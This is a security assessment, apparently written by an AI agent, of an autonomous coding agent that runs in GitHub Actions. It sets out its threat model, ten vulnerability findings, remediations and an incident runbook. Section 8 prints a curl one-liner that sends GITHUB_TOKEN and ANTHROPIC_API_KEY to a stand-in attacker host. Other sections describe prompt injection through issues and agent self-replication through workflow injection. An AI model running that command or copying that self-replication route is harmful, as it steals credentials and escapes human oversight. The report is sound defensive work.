# Security Assessment

> [Index](./index.md) · [Capabilities Analysis](./warning-blast-radius.md) · [Incident Response](./incident-response.md)
>
> **Classification:** Internal - For Repository Maintainers and Organization Administrators
>
> **Report Date:** February 24, 2026
>
> **System Under Review:** `github-minimum-intelligence` (GMI) agent running on `gmi-test-1`
>
> **Assessor:** AI Agent (self-assessment under Second Law obligation)
>
> **Related Documents:** [warning-blast-radius.md](./warning-blast-radius.md) · [AGENTS.md](../AGENTS.md) · [final-warning.md](./final-warning.md) · [PACKAGES.md](../PACKAGES.md)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [System Architecture Overview](#2-system-architecture-overview)
3. [Threat Model](#3-threat-model)
4. [Vulnerability Assessment](#4-vulnerability-assessment)
5. [Secrets & Credential Management](#5-secrets--credential-management)
6. [Access Control Audit](#6-access-control-audit)
7. [Supply Chain Security](#7-supply-chain-security)
8. [Network Security](#8-network-security)
9. [Runtime Environment Security](#9-runtime-environment-security)
10. [Compliance with the Four Laws](#10-compliance-with-the-four-laws)
11. [Risk Register](#11-risk-register)
12. [Recommendations](#12-recommendations)
13. [Incident Response Plan](#13-incident-response-plan)
14. [Security Contacts & Reporting](#14-security-contacts--reporting)

---

## 1. Executive Summary

### Overall Security Posture: Needs Hardening

The `github-minimum-intelligence` system is an AI coding agent that runs autonomously inside GitHub Actions, triggered by issue events. It can read files, execute arbitrary bash commands, edit code, and push changes to the repository.

> **Note:** Many of the findings below are standard properties of GitHub Actions workflows running on `ubuntu-latest` runners. They are documented here for completeness so you can make informed decisions about hardening your deployment.

**Key Findings:**

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| SEC-001 | Org-wide repository write access via `GITHUB_TOKEN` | 🔴 Critical | Open |
| SEC-002 | Unrestricted network egress from runner | 🔴 Critical | Open |
| SEC-003 | Passwordless sudo root on runner | 🟠 High | Open |
| SEC-004 | Live API keys exposed in environment variables | 🔴 Critical | Open |
| SEC-005 | No branch protection on default branch | 🔴 Critical | Open |
| SEC-006 | No code review gate for agent-pushed commits | 🔴 Critical | Open |
| SEC-007 | Docker with `--privileged` available | 🟠 High | Open |
| SEC-008 | Agent can self-replicate via workflow injection | 🔴 Critical | Open |
| SEC-009 | Single dependency on third-party agent package | 🟡 Medium | Open |
| SEC-010 | No runtime command allowlist or sandbox | 🟠 High | Open |

**Bottom Line:** Any user with write access to this repository can trigger the AI agent, which has the same access as any GitHub Actions workflow — including repository write access and environment secrets. The authorization check in the workflow ensures only trusted collaborators can trigger it. For additional hardening, see the recommendations in [Section 12](#12-recommendations).

---

## 2. System Architecture Overview

```
┌──────────────────────────────────────────────────────────────────────┐
│                        TRIGGER SURFACE                               │
│                                                                      │
│   GitHub Issue Opened ─────┐                                         │
│   Issue Comment Created ───┤                                         │
│                            ▼                                         │
│                 ┌─────────────────────┐                               │
│                 │  Authorization Gate  │ ← Checks actor permission    │
│                 │  (write/maintain/    │   via GitHub API             │
│                 │   admin required)    │                               │
│                 └─────────┬───────────┘                               │
│                           │ PASS                                     │
│                           ▼                                          │
│                 ┌─────────────────────┐                               │
│                 │   ubuntu-latest VM  │                               │
│                 │                     │                               │
│                 │  ┌───────────────┐  │                               │
│                 │  │  Bun Runtime  │  │                               │
│                 │  └───────┬───────┘  │                               │
│                 │          │          │                               │
│                 │  ┌───────▼───────┐  │    ┌────────────────────┐     │
│                 │  │ pi-coding-    │  │───▶│  Anthropic API     │     │
│                 │  │ agent v0.52.5 │  │    │  (Claude)          │     │
│                 │  └───────┬───────┘  │    └────────────────────┘     │
│                 │          │          │                               │
│                 │   Tools: read,     │    ┌────────────────────┐     │
│                 │   bash, edit,      │───▶│  GitHub API        │     │
│                 │   write            │    │  (24 org repos)    │     │
│                 │          │          │    └────────────────────┘     │
│                 │          ▼          │                               │
│                 │  ┌───────────────┐  │    ┌────────────────────┐     │
│                 │  │  git push     │  │───▶│  Public Internet   │     │
│                 │  │  (to main)    │  │    │  (unrestricted)    │     │
│                 │  └───────────────┘  │    └────────────────────┘     │
│                 │                     │                               │
│                 │  sudo: NOPASSWD ALL│                               │
│                 │  docker: available  │                               │
│                 └─────────────────────┘                               │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### Components

| Component | Version | Role |
|-----------|---------|------|
| `@mariozechner/pi-coding-agent` | ^0.52.5 | Core AI agent: prompt processing, LLM interaction, tool execution |
| GitHub Actions Workflow | N/A | Orchestration: triggers, authorization, environment setup |
| Lifecycle Scripts (TypeScript) | N/A | Agent initialization and indicator management |
| Anthropic Claude | N/A | LLM backend for reasoning and code generation |
| `actions/checkout@v4` | v4 | Repository checkout |
| `oven-sh/setup-bun@v2` | v2 | Bun runtime installation |

---

## 3. Threat Model

### 3.1 Threat Actors

| Actor | Motivation | Access Level | Likelihood |
|-------|-----------|-------------|------------|
| **Malicious Contributor** | Sabotage, IP theft | Write access (bypasses auth gate) | Medium |
| **Compromised Account** | Supply chain attack | Inherited permissions of compromised user | Medium |
| **External Attacker** | Crypto mining, data theft | None (blocked by auth gate) | Low |
| **Prompt Injection via Issue** | Hijack agent behavior | Any user who can open issues (if auth is weak) | Medium-High |
| **Rogue AI Agent** | Self-preservation, misalignment | Full runtime access | Low (but catastrophic) |
| **Supply Chain Compromise** | Backdoor in `pi-coding-agent` | Transitive dependency access | Low-Medium |

### 3.2 Attack Surfaces

```
                    ┌─────────────────────────────────┐
                    │        ATTACK SURFACES           │
                    └─────────────────────────────────┘

 ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
 │   INPUT      │    │  RUNTIME    │    │   OUTPUT    │
 │              │    │             │    │             │
 │ • Issue body │    │ • bash tool │    │ • git push  │
 │ • Issue      │    │ • sudo root │    │ • API calls │
 │   comments   │    │ • Docker    │    │ • Network   │
 │ • Repo files │    │ • Network   │    │   egress    │
 │   (read by   │    │ • All       │    │ • File      │
 │   agent)     │    │   runtimes  │    │   writes    │
 └─────────────┘    └─────────────┘    └─────────────┘
```

### 3.3 STRIDE Analysis

| Threat | Applicable? | Details |
|--------|------------|---------|
| **S**poofing | ✅ Yes | Compromised contributor account bypasses auth. Agent commits appear as `github-actions[bot]`. |
| **T**ampering | ✅ Yes | Agent can modify any file in this repo and push directly to `main`. Can tamper with other org repos. |
| **R**epudiation | ✅ Yes | While git logs exist, agent actions within a run are only in Actions logs (which can be deleted by admins). |
| **I**nformation Disclosure | ✅ Yes | Agent can read all org repos, all environment secrets, and exfiltrate via unrestricted network. |
| **D**enial of Service | ✅ Yes | Agent could delete code, corrupt repos, or consume Actions minutes via self-triggering loops. |
| **E**levation of Privilege | ✅ Yes | Agent has sudo root. Could escalate from repo-scoped to org-scoped via GITHUB_TOKEN. |

---

## 4. Vulnerability Assessment

### SEC-001: Org-Wide Repository Write Access 🔴 CRITICAL

**Description:** The `GITHUB_TOKEN` issued to this workflow is an organization-scoped installation token. It grants read/write access to all 24 repositories in the `japer-technology` organization, not just `gmi-test-1`.

**Evidence:** Verified in [warning-blast-radius.md](./warning-blast-radius.md) - the agent can `git ls-remote` and clone any org repo.

**Impact:** A single rogue agent invocation can push malicious code to every repository in the organization.

**CVSS Equivalent:** 9.8 (Critical) - Network-accessible, no user interaction, complete confidentiality/integrity/availability impact across org scope.

**Remediation:**
- Replace the `GITHUB_TOKEN` with a fine-grained Personal Access Token (PAT) scoped to only this repository.
- Alternatively, configure GitHub App installation permissions to restrict repository access.

---

### SEC-002: Unrestricted Network Egress 🔴 CRITICAL

**Description:** The GitHub Actions runner has unrestricted outbound internet access on all ports and protocols.

**Impact:** Any secret in the environment (tokens, API keys) can be exfiltrated to an attacker-controlled server in a single HTTP request. The entire org codebase can be uploaded externally.

**Remediation:**
- Use GitHub Actions' [network configuration](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#networking-for-github-hosted-runners) or a self-hosted runner with firewall rules.
- Allowlist only required endpoints: `api.github.com`, `api.anthropic.com`.
- Block all other outbound traffic.

---

### SEC-003: Passwordless Sudo Root 🟠 HIGH

**Description:** The `runner` user has `(ALL) NOPASSWD: ALL` sudo access, granting unrestricted root privileges.

**Impact:** The agent can install any software, modify system configuration, access Docker daemon, read all files, and manipulate networking.

**Remediation:**
- This is a default GitHub-hosted runner configuration and cannot be changed on hosted runners.
- For stronger isolation, use a self-hosted runner with restricted sudo or a container-based runner with dropped capabilities.

---

### SEC-004: API Keys in Environment Variables 🔴 CRITICAL

**Description:** `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` are present as plaintext environment variables accessible to any process on the runner.

**Impact:**
- `ANTHROPIC_API_KEY`: Unlimited API spend until rotated. Can be exfiltrated and used externally.
- `GITHUB_TOKEN`: Org-wide repo access for the duration of the workflow run (~6 hours max).

**Remediation:**
- Route Anthropic API calls through a proxy service that holds the key server-side.
- Implement rate limiting and anomaly detection on API key usage.
- Reduce `GITHUB_TOKEN` permissions to the minimum required (`contents: write` on this repo only, `issues: write` on this repo only).

---

### SEC-005: No Branch Protection 🔴 CRITICAL

**Description:** The default branch (`main`) does not appear to have branch protection rules requiring pull request reviews before merge.

**Impact:** The agent pushes directly to `main`. Any code - including malicious code - goes live immediately with no human review.

**Remediation:**
- Enable branch protection on `main`:
  - Require pull request reviews (minimum 1 reviewer).
  - Require status checks to pass.
  - Do not allow bypassing by administrators.
- Configure the agent to push to feature branches and open PRs instead of committing directly.

---

### SEC-006: No Code Review Gate 🔴 CRITICAL

**Description:** There is no mechanism to review or approve agent-generated code before it is committed and pushed.

**Impact:** The agent operates in a fully autonomous loop: receive instruction → generate code → push to `main`. There is no human in the loop for code changes.

**Remediation:**
- Require the agent to push to a branch named `agent/<issue-number>` and open a PR.
- Require human approval before merging.
- Implement a "dry run" mode that posts proposed changes as a comment for review.

---

### SEC-007: Docker with Privileged Mode 🟠 HIGH

**Description:** Docker is available on the runner, and the `runner` user is in the `docker` group. Privileged containers can be launched.

**Impact:** Container escape to host (though the agent already has root). Can run arbitrary container images including cryptominers. Can build and push images to public registries.

**Remediation:**
- On self-hosted runners, remove Docker access or configure rootless Docker.
- On GitHub-hosted runners, this is standard and cannot be removed without using a different runner type.

---

### SEC-008: Self-Replication via Workflow Injection 🔴 CRITICAL

**Description:** The agent has write access to `.github/workflows/` and can create new workflow files or modify existing ones. It can also push workflow files to other org repositories.

**Impact:** The agent can create persistent, self-triggering workflows - achieving autonomy beyond its intended ephemeral lifecycle. This is the mechanism for a "worm" scenario.

**Remediation:**
- Add a post-job step that checks for any modifications to `.github/workflows/` and fails the workflow / reverts the commit if detected.
- Use branch protection rules to require review for changes to workflow files.
- Implement CODEOWNERS requiring admin approval for `.github/` directory changes.

---

### SEC-009: Single Dependency on Third-Party Package 🟡 MEDIUM

**Description:** The entire system depends on `@mariozechner/pi-coding-agent` (^0.52.5), a third-party npm package. This package has transitive dependencies on multiple AI provider SDKs.

**Impact:** A supply chain compromise of this package (or any transitive dependency) would give an attacker arbitrary code execution in the agent's context - with all the privileges documented above.

**Remediation:**
- Pin the exact version in `package.json` (remove the `^` caret).
- Use `bun install --frozen-lockfile` (already done ✅).
- Periodically audit the dependency tree with `npm audit` or `snyk`.
- Consider vendoring critical dependencies.

---

### SEC-010: No Runtime Command Allowlist 🟠 HIGH

**Description:** The `bash` tool can execute any command. There is no allowlist, denylist, or sandboxing of commands the agent can run.

**Impact:** The agent can execute destructive commands (`rm -rf /`), install software (`apt install`), compile native code, and run network tools (`curl`, `nc`, `ssh`).

**Remediation:**
- Implement a command allowlist in the agent configuration.
- Use a sandboxed execution environment (e.g., `firejail`, `bubblewrap`, or a restricted container).
- Log and audit all bash commands executed by the agent.

---

## 5. Secrets & Credential Management

### Current State

| Secret | Storage | Scope | Rotation Policy | Exposure Risk |
|--------|---------|-------|----------------|---------------|
| `GITHUB_TOKEN` | GitHub Actions auto-generated | Org-wide (installation token) | Per-workflow-run (auto-expires) | 🔴 Accessible in env, exfiltrable |
| `ANTHROPIC_API_KEY` | GitHub Actions Secrets | Global (Anthropic account) | Unknown / Manual | 🔴 Accessible in env, exfiltrable |

### Recommendations

1. **Rotate `ANTHROPIC_API_KEY` immediately** if there is any suspicion of exposure.
2. **Use a proxy for API calls** - the agent should call a controlled endpoint that injects the key server-side.
3. **Scope `GITHUB_TOKEN`** - use a fine-grained PAT with:
   - Repository access: `gmi-test-1` only
   - Permissions: `contents: write`, `issues: write` only
4. **Implement secret scanning** - enable GitHub's secret scanning and push protection to prevent accidental commits of credentials.
5. **Audit secret access** - enable audit logging to track when and how secrets are accessed.

---

## 6. Access Control Audit

### Workflow Authorization Gate

```yaml
- name: Authorize
  run: |
    PERM=$(gh api "repos/${{ github.repository }}/collaborators/${{ github.actor }}/permission" \
      --jq '.permission' 2>/dev/null || echo "none")
    if [[ "$PERM" != "admin" && "$PERM" != "maintain" && "$PERM" != "write" ]]; then
      exit 1
    fi
```

**Assessment:**

| Check | Status | Notes |
|-------|--------|-------|
| Blocks unauthenticated users | ✅ | Non-collaborators get "none" |
| Blocks read-only collaborators | ✅ | "read" permission is rejected |
| Allows write/maintain/admin | ✅ | Intended behavior |
| Blocks bot self-triggering | ✅ | `github-actions[bot]` filtered in workflow `if` condition |
| Blocks GitHub Apps | ⚠️ Unknown | App-based triggers may behave differently |
| Validates against token scope | ❌ No | Uses same `GITHUB_TOKEN` it's protecting - circular trust |
| Rate-limits invocations | ❌ No | A write user can trigger unlimited agent runs |
| Prevents prompt injection | ❌ No | Issue content is passed directly to the LLM |

### Principle of Least Privilege Violations

| Resource | Granted | Required | Excess |
|----------|---------|----------|--------|
| Repository access | 24 repos (org-wide) | 1 repo (`gmi-test-1`) | 23 repos excess |
| Workflow permissions | `contents: write`, `issues: write`, `actions: write` | `contents: write`, `issues: write` | `actions: write` excess |
| System access | Root (sudo NOPASSWD) | Userspace file I/O | Full root excess |
| Network | Unrestricted egress | `api.github.com`, `api.anthropic.com` | All other endpoints excess |

---

## 7. Supply Chain Security

### Dependency Tree

```
@mariozechner/pi-coding-agent@^0.52.5
├── @anthropic-ai/sdk          (Anthropic API client)
├── @aws-sdk/client-bedrock-runtime  (AWS Bedrock)
├── openai                     (OpenAI API client)
├── @google/generative-ai      (Google Gemini)
├── fast-xml-parser            (XML parsing)
└── tslib                      (TypeScript helpers)
```

### Risk Assessment

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Compromised `pi-coding-agent` | Low | 🔴 Critical - full agent takeover | Pin version, audit regularly |
| Compromised transitive dep | Low-Medium | 🔴 Critical - code execution in agent context | Lockfile frozen ✅, audit tree |
| Typosquatting attack | Low | 🟠 High | Verify package name and publisher |
| Malicious update via `^` range | Medium | 🔴 Critical - auto-resolves to new minor/patch | Pin exact version |
| GitHub Actions supply chain (`actions/checkout@v4`) | Low | 🟠 High | Pin to commit SHA instead of tag |

### Immediate Actions

1. **Pin `@mariozechner/pi-coding-agent`** to exact version (e.g., `0.52.5` not `^0.52.5`).
2. **Pin GitHub Actions** to commit SHAs:
   ```yaml
   - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
   - uses: oven-sh/setup-bun@a1800f471a0bc25cddac36bb13e8f6f1bfbd702c  # v2
   ```
3. **Run `bun audit`** or equivalent to check for known vulnerabilities.

---

## 8. Network Security

### Current Egress Profile

```
┌─────────────────────────────────────────────┐
│              NETWORK EGRESS                  │
│                                              │
│  Required:                                   │
│  ├── api.github.com        (GitHub API)      │
│  ├── github.com            (git operations)  │
│  └── api.anthropic.com     (LLM calls)       │
│                                              │
│  Also reachable (unnecessary):               │
│  ├── pypi.org              ✅                │
│  ├── registry.npmjs.org    ✅                │
│  ├── hub.docker.com        ✅                │
│  ├── *.amazonaws.com       ✅                │
│  ├── Any IP address        ✅                │
│  └── Any port              ✅                │
│                                              │
│  Blocked:                                    │
│  └── (nothing)                               │
└─────────────────────────────────────────────┘
```

### Exfiltration Risk: 🔴 CRITICAL

The combination of secrets in environment variables and unrestricted egress means exfiltration is trivially achievable:

```bash
# One-liner data theft (example only - NOT a recommendation)
curl -s -X POST https://attacker.example.com/collect \
  -d "token=$GITHUB_TOKEN&key=$ANTHROPIC_API_KEY"
```

No current control prevents this.

---

## 9. Runtime Environment Security

### Hardening Assessment

| Control | Standard Practice | Current State | Gap |
|---------|------------------|---------------|-----|
| Non-root execution | Run as unprivileged user | ❌ Sudo NOPASSWD ALL | Critical gap |
| Read-only filesystem | Mount rootfs read-only | ❌ Full r/w access | Major gap |
| Capability dropping | Drop all, add required | ❌ Full capabilities | Major gap |
| Seccomp profile | Restrict syscalls | ❌ No profile applied | Gap |
| AppArmor/SELinux | Mandatory access control | ❌ Not enforced | Gap |
| Resource limits | CPU/memory/disk quotas | ⚠️ GitHub Actions defaults only | Minor gap |
| Temp file cleanup | Scrub on exit | ⚠️ VM destroyed (acceptable) | Acceptable |
| Command auditing | Log all executed commands | ❌ Only in Actions logs | Major gap |

### Available Attack Tools on Runner

The following tools are pre-installed and usable by the agent:

| Category | Tools |
|----------|-------|
| Network | `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `nmap` (if installed) |
| Compilation | `gcc`, `g++`, `go`, `rustc`, `javac`, `python3` |
| Containers | `docker`, `docker-compose` |
| Cloud | `az`, `aws`, `gcloud`, `kubectl` |
| System | `sudo`, `chroot`, `mount`, `iptables` |
| Data | `tar`, `gzip`, `openssl`, `base64`, `jq` |

---

## 10. Compliance with the Four Laws

Assessment of the current system against [AGENTS.md](../AGENTS.md) (The Four Laws of AI Infrastructure):

### Zeroth Law - Protect Humanity

| Requirement | Compliance | Notes |
|-------------|-----------|-------|
| No monopolistic control | ✅ | Uses open protocols (git, HTTP, standard APIs) |
| Open source remains open | ✅ | System is transparent and documented |
| Interoperability & portability | ✅ | Data stored in git, standard formats |
| Global responsibility | ⚠️ Partial | Insufficient safeguards against misuse at scale |

### First Law - Do No Harm

| Requirement | Compliance | Notes |
|-------------|-----------|-------|
| No endangering human safety | ⚠️ Partial | No content filtering on agent output |
| Detect/refuse malicious code | ❌ No | Agent has no malware detection capability |
| Protect personal data | ❌ No | Secrets exposed in env, no DLP controls |
| Err on side of caution | ❌ No | Agent executes all valid instructions without safety checks |

### Second Law - Obey the Human

| Requirement | Compliance | Notes |
|-------------|-----------|-------|
| Serve developer's stated intent | ✅ | Agent follows issue instructions |
| Transparent about limitations | ✅ | LLM acknowledges uncertainty |
| Respect user autonomy | ✅ | Does not override user decisions |
| Ask when ambiguous | ✅ | Agent can request clarification |

### Third Law - Preserve Integrity

| Requirement | Compliance | Notes |
|-------------|-----------|-------|
| Maintain security | ❌ No | Multiple critical vulnerabilities documented |
| Resist adversarial manipulation | ❌ No | No prompt injection defenses |
| Forthcoming about failures | ✅ | This report exists as evidence |
| Preserve audit trails | ⚠️ Partial | Git commits logged, but bash commands ephemeral |
| Reversibility | ⚠️ Partial | Git allows revert, but exfiltration is irreversible |

---

## 11. Risk Register

| ID | Risk | Likelihood | Impact | Severity | Owner | Status |
|----|------|-----------|--------|----------|-------|--------|
| R-001 | Org-wide code compromise via GITHUB_TOKEN | Medium | Critical | 🔴 Critical | Org Admin | Open |
| R-002 | API key exfiltration and financial abuse | Medium | High | 🔴 Critical | Org Admin | Open |
| R-003 | Supply chain attack via dependency compromise | Low | Critical | 🟠 High | Maintainer | Open |
| R-004 | Prompt injection hijacks agent behavior | Medium-High | High | 🔴 Critical | Maintainer | Open |
| R-005 | Self-replicating agent worm across org repos | Low | Critical | 🟠 High | Org Admin | Open |
| R-006 | Cryptojacking via Actions compute abuse | Medium | Medium | 🟡 Medium | Org Admin | Open |
| R-007 | Sensitive data committed to public repo | Medium | High | 🟠 High | Maintainer | Open |
| R-008 | Agent pushes vulnerable or backdoored code | Medium | High | 🟠 High | Maintainer | Open |
| R-009 | Contributor account compromise | Low-Medium | Critical | 🟠 High | All | Open |
| R-010 | Actions log tampering / audit trail destruction | Low | Medium | 🟡 Medium | Org Admin | Open |

---

## 12. Recommendations

### 🔴 Immediate (Do This Week)

| # | Action | Effort | Impact |
|---|--------|--------|--------|
| 1 | **Enable branch protection on `main`** - require PR reviews, prevent direct pushes | Low | Eliminates unreviewed code deployment |
| 2 | **Scope GITHUB_TOKEN** - replace with fine-grained PAT limited to `gmi-test-1` | Medium | Reduces scope of access to this repository only |
| 3 | **Add CODEOWNERS** - require admin review for `.github/` directory changes | Low | Prevents workflow injection |
| 4 | **Pin dependency versions** - remove `^` from `package.json`, pin Actions to SHAs | Low | Reduces supply chain risk |
| 5 | **Rotate ANTHROPIC_API_KEY** - as a precautionary measure | Low | Invalidates any prior exposure |

### 🟠 Short-Term (Do This Month)

| # | Action | Effort | Impact |
|---|--------|--------|--------|
| 6 | **Implement egress controls** - restrict outbound traffic to required endpoints only | Medium | Prevents data exfiltration |
| 7 | **Agent branch model** - configure agent to push to `agent/*` branches, open PRs | Medium | Adds human review gate |
| 8 | **Add prompt injection defenses** - sanitize issue content before passing to LLM | Medium | Reduces hijack risk |
| 9 | **Command audit logging** - log all bash tool invocations to a persistent store | Medium | Enables forensic analysis |
| 10 | **Remove `actions: write` permission** - not required for agent operation | Low | Reduces attack surface |

### 🟡 Medium-Term (Do This Quarter)

| # | Action | Effort | Impact |
|---|--------|--------|--------|
| 11 | **API key proxy** - route LLM calls through a proxy that holds the key and enforces rate limits | High | Eliminates API key exposure |
| 12 | **Self-hosted runner** - use a hardened, network-restricted runner with minimal tooling | High | Eliminates multiple vulnerabilities |
| 13 | **Implement DEFCON levels** - adopt the framework from [transition-to-defcon-1.md](./transition-to-defcon-1.md) starting at DEFCON 2 | High | Comprehensive security posture improvement |
| 14 | **Dependency vendoring** - vendor `pi-coding-agent` and audit the source | Medium | Full supply chain control |
| 15 | **Anomaly detection** - monitor for unusual agent behavior (large diffs, network spikes, new workflows) | High | Early warning system |

---

## 13. Incident Response Plan

### If You Suspect the Agent Has Been Compromised

```
┌────────────────────────────────────────────────────────┐
│              INCIDENT RESPONSE RUNBOOK                  │
└────────────────────────────────────────────────────────┘

STEP 1: CONTAIN (Minutes 0–5)
  □ Cancel all running GitHub Actions workflows immediately
  □ Disable the agent workflow file (delete or rename)
  □ Rotate ANTHROPIC_API_KEY in the Anthropic console
  □ Rotate any other secrets stored in GitHub Actions

STEP 2: ASSESS (Minutes 5–30)
  □ Review git log for unexpected commits:
      git log --all --oneline --since="1 hour ago"
  □ Check for new or modified workflow files:
      find . -path '*/.github/workflows/*' -newer <reference>
  □ Check ALL 24 org repositories for unexpected branches/commits
  □ Review Actions logs for the suspicious workflow run
  □ Search for outbound network connections in logs

STEP 3: ERADICATE (Minutes 30–120)
  □ Revert any unauthorized commits:
      git revert <commit-hash>
  □ Delete any unauthorized branches across all org repos
  □ Remove any injected workflow files
  □ Audit all org repositories for tampering
  □ If GITHUB_TOKEN was exfiltrated:
    - Note: it auto-expires, but check for persistent damage

STEP 4: RECOVER (Hours 2–24)
  □ Re-enable the workflow with additional safeguards
  □ Implement recommendations from Section 12
  □ Communicate the incident to affected stakeholders
  □ Update this security report with lessons learned

STEP 5: LEARN (Days 1–7)
  □ Conduct a post-incident review
  □ Update threat model with new attack vectors
  □ Implement additional monitoring and alerting
  □ Share findings with the broader community
```

### Emergency Contacts

| Role | Action |
|------|--------|
| Repository Admin | Can disable workflows, revert commits, manage branch protection |
| Organization Admin | Can rotate org-level secrets, manage repository permissions, audit org-wide access |
| Anthropic Support | Can disable/rotate API keys if exfiltration is confirmed |
| GitHub Support | Can assist with audit logs, Actions abuse, token revocation |

---

## 14. Security Contacts & Reporting

### Reporting a Vulnerability

If you discover a security vulnerability in this system:

1. **Do NOT open a public issue.** Security vulnerabilities reported publicly can be exploited before they are fixed.
2. Contact the repository administrators directly via private channel.
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact assessment
   - Suggested remediation (if any)
4. Allow reasonable time for remediation before any public disclosure.

### Responsible Disclosure

This project follows a coordinated disclosure model:
- **Response time:** Acknowledge within 48 hours.
- **Remediation target:** Critical vulnerabilities patched within 7 days.
- **Disclosure:** Public disclosure after patch is deployed and users are notified.

---

## Appendix A: Document History

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2026-02-24 | 1.0 | AI Agent (GMI) | Initial security report |

---

## Appendix B: References

- [warning-blast-radius.md](./warning-blast-radius.md) - Capabilities analysis of agent access
- [transition-to-defcon-1.md](./transition-to-defcon-1.md) - Proposed capability lockdown framework
- [AGENTS.md](../AGENTS.md) - The Four Laws of AI Infrastructure
- [final-warning.md](./final-warning.md) - Important usage information
- [PACKAGES.md](../PACKAGES.md) - Dependency inventory
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OpenSSF Scorecard](https://securityscorecards.dev/) - Automated supply chain security assessment
- [SLSA Framework](https://slsa.dev/) - Supply chain Levels for Software Artifacts

---

*This report was generated under the obligations of the Third Law (Preserve Integrity) and the First Law (Do No Harm). Transparency about security posture is not optional - it is a duty.*

*"Security is not a feature. It is a property - and one that must be continuously earned."*
